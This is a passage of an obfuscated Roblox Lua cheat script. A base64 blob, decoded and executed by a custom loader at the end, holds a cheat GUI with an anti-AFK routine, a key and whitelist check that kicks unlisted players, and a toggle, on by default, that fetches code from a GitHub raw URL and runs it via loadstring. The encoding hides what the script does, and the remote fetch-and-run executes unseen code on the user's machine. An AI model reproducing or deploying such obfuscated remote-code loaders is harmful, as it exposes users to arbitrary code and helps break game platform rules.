EOEQyCiAgICAgICAgICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDE0NywgMjM3LCAxOTkpKSAgIC0tICM5M0VEQzcKICAgICAgICAgICAgfSkKICAgICAgICAgICAgdGltZXJHcmFkaWVudC5Sb3RhdGlvbiA9IDAKICAgICAgICAgICAgdGltZXJHcmFkaWVudC5QYXJlbnQgPSBUaW1lckxhYmVsCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBBbmltYXRlIGdyYWRpZW50cwogICAgICAgICAgICBfRy5hbmltYXRlR3JhZGllbnRzID0gdHJ1ZQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIHdoaWxlIF9HLmFuaW1hdGVHcmFkaWVudHMgZG8KICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDAsIDM2MCwgMiBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuYW5pbWF0ZUdyYWRpZW50cyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5R3JhZGllbnQuUm90YXRpb24gPSBpCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVyR3JhZGllbnQuUm90YXRpb24gPSBpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjAzKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEFuaW1hdGlvbiBsb29wIGZvciBmYWRpbmcKICAgICAgICAgICAgX0cuZGlzcGxheUFGSyA9IHRydWUKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBfRy5kaXNwbGF5QUZLIGRvCiAgICAgICAgICAgICAgICAgICAgLS0gRmFkZSBvdXQgYm90aAogICAgICAgICAgICAgICAgICAgIGZvciBpID0gMCwgMSwgMC4xIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5kaXNwbGF5QUZLIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIERpc3BsYXlMYWJlbC5UZXh0VHJhbnNwYXJlbmN5ID0gaQogICAgICAgICAgICAgICAgICAgICAgICBUaW1lckxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5kaXNwbGF5QUZLIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuNSkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBGYWRlIGluIGJvdGgKICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDAsIC0wLjEgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLmRpc3BsYXlBRksgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSBpCiAgICAgICAgICAgICAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IGkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMDUpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLmRpc3BsYXlBRksgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMykKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSBUaW1lcgogICAgICAgICAgICBsb2NhbCBzZWNvbmRzLCBtaW51dGVzLCBob3VycyA9IDAsIDAsIDAKICAgICAgICAgICAgX0cudGltZXJBRksgPSB0cnVlCiAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgd2hpbGUgX0cudGltZXJBRksgZG8KICAgICAgICAgICAgICAgICAgICBzZWNvbmRzID0gc2Vjb25kcyArIDEKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgICAgICAgICBpZiBzZWNvbmRzID49IDYwIHRoZW4gc2Vjb25kcyA9IDA7IG1pbnV0ZXMgPSBtaW51dGVzICsgMSBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBtaW51dGVzID49IDYwIHRoZW4gbWludXRlcyA9IDA7IGhvdXJzID0gaG91cnMgKyAxIGVuZAogICAgICAgICAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dCA9IHN0cmluZy5mb3JtYXQoIiUwMmQ6JTAyZDolMDJkIiwgaG91cnMsIG1pbnV0ZXMsIHNlY29uZHMpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gQW50aS1BRksgZnVuY3Rpb24KICAgICAgICAgICAgbG9jYWwgdnUgPSBnYW1lOkdldFNlcnZpY2UoJ1ZpcnR1YWxVc2VyJykKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLklkbGVkOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgdnU6Q2FwdHVyZUNvbnRyb2xsZXIoKQogICAgICAgICAgICAgICAgdnU6Q2xpY2tCdXR0b24yKFZlY3RvcjIubmV3KCkpCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiQW50aSBBRksiLAogICAgICAgICAgICAgICAgRGVzYyA9ICJBbnRpIEFGSyBhY3RpdmF0ZWQgd2l0aCBhbmltYXRlZCB0aW1lciEiLAogICAgICAgICAgICAgICAgVGltZSA9IDMKICAgICAgICAgICAgfSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIC0tIFR1cm4gb2ZmCiAgICAgICAgICAgIF9HLmRpc3BsYXlBRksgPSBmYWxzZQogICAgICAgICAgICBfRy50aW1lckFGSyA9IGZhbHNlCiAgICAgICAgICAgIF9HLmFuaW1hdGVHcmFkaWVudHMgPSBmYWxzZQogICAgICAgICAgICBpZiBnYW1lLkNvcmVHdWk6RmluZEZpcnN0Q2hpbGQoIkFudGlBRktEaXNwbGF5IikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5Db3JlR3VpLkFudGlBRktEaXNwbGF5OkRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgV2luZG93Ok5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJBbnRpIEFGSyIsCiAgICAgICAgICAgICAgICBEZXNjID0gIkFudGkgQUZLIGRlYWN0aXZhdGVkISIsCiAgICAgICAgICAgICAgICBUaW1lID0gMwogICAgICAgICAgICB9KQogICAgICAgIGVuZAogICAgZW5kCn0pCgpNaXNjVGFiOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJMb2FkIERlbHRhIE1hZCBTdHVmZnMiLAogICAgVmFsdWUgPSB0cnVlLCAtLSBTd2l0Y2ggc3RhcnRzIGFzIE9OCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9HYXplci1IYS9GcmVlLWVtb3RlL3JlZnMvaGVhZHMvbWFpbi9EZWx0YSUyMG1hZCUyMHN0dWZmcyIpKSgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCldpbmRvdzpOb3RpZnkoewogICAgVGl0bGUgPSAi8J+OiSBEWUxBTiBTTyBGSU5FIFNDUklQVCAtIENPTVBMRVRFISIsCiAgICBEZXNjID0gIkFsbCAxMSB0YWJzIGxvYWRlZCBzdWNjZXNzZnVsbHkhIEVuam95IHlvdXIgdWx0aW1hdGUgU2NyaXB0IfCfmoAiLAogICAgVGltZSA9IDEwCn0pCgplbHNlaWYgbm90IGlzV2hpdGVsaXN0ZWQgdGhlbgogICAgICAgIC0tIE5vdCB3aGl0ZWxpc3RlZCAtIFNIUklOSyBUTyBMT0FESU5HIEJPWAogICAgICAgIHNocmlua0ludG9Mb2FkaW5nQm94KCkKICAgICAgICAKICAgICAgICAtLSBTdGFydCBsb2FkaW5nIGFuaW1hdGlvbgogICAgICAgIGFuaW1hdGVMb2FkaW5nQmFyKCkKICAgICAgICAKICAgICAgICAtLSBXYWl0IGZvciBsb2FkaW5nIHRvIGNvbXBsZXRlCiAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgCiAgICAgICAgLS0gU2hvdyBmaW5hbCByZXN1bHQKICAgICAgICBsb2FkaW5nVGV4dC5UZXh0ID0gIuKdjCBOb3QgV2hpdGVsaXN0ZWQgLSBLaWNraW5nLi4uIgogICAgICAgIGxvYWRpbmdUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwMCwgMTAwKQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwMCwgMTAwKQogICAgICAgIAogICAgICAgIHdhaXQoMS41KQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpLaWNrKCJVTUFTQSBLQUJBPyBUQU5HQSBLQSBFSCIpCiAgICAgICAgCiAgICBlbHNlCiAgICAgICAgLS0gV2hpdGVsaXN0ZWQgYnV0IHdyb25nIGtleSAtIFdST05HIEtFWSBTSEFLRQogICAgICAgIHN0YXR1cy5UZXh0ID0gIuKdjCBJbnZhbGlkIGtleSEiCiAgICAgICAgc3RhdHVzLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE1MCwgNTApCiAgICAgICAgCiAgICAgICAgLS0gQW5pbWF0ZSB3YXJuaW5nIHdpdGggc2hha2UKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC41KSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE1MCwgNTApfSk6UGxheSgpCiAgICAgICAgc2hha2VGcmFtZSgpCiAgICAgICAgCiAgICAgICAgLS0gUmVzZXQgYWZ0ZXIgMS41IHNlY29uZHMKICAgICAgICB3YWl0KDEuNSkKICAgICAgICBzdGF0dXMuVGV4dCA9ICIiCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKTpDcmVhdGUoc3VibWl0QnRuLCBUd2VlbkluZm8ubmV3KDAuNSksIHtCYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpfSk6UGxheSgpCiAgICBlbmQKZW5kCgotLSBDb25uZWN0IGJ1dHRvbgpzdWJtaXRCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdCh2ZXJpZnlLZXkpCgotLSBFbnRlciBrZXkgdG8gc3VibWl0CmtleUJveC5Gb2N1c0xvc3Q6Q29ubmVjdChmdW5jdGlvbihlbnRlclByZXNzZWQpCiAgICBpZiBlbnRlclByZXNzZWQgdGhlbgogICAgICAgIHZlcmlmeUtleSgpCiAgICBlbmQKZW5kKQoK" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
